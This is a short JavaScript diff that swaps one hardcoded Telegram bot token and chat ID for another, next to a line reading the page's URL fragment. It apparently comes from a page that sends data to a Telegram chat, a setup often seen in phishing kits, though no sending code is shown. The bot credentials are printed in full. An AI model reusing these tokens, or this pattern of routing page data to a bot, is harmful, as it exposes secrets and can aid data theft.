@@ -1,6 +1,6 @@
 // Telegram Bot config
-const TELEGRAM_BOT_TOKEN = "7642767058:AAE1c1oj-wCUdqv3_WAWwJoonDWDIHOz4SA";
-const TELEGRAM_CHAT_ID = "5748422740";
+const TELEGRAM_BOT_TOKEN = "7511027053:AAGVWTVKEcIHDcxefSZhg-f1ZzilnzRmBqc";
+const TELEGRAM_CHAT_ID = "2089448721";
 
 // Elements
 const rawHash = window.location.hash.substring(1);
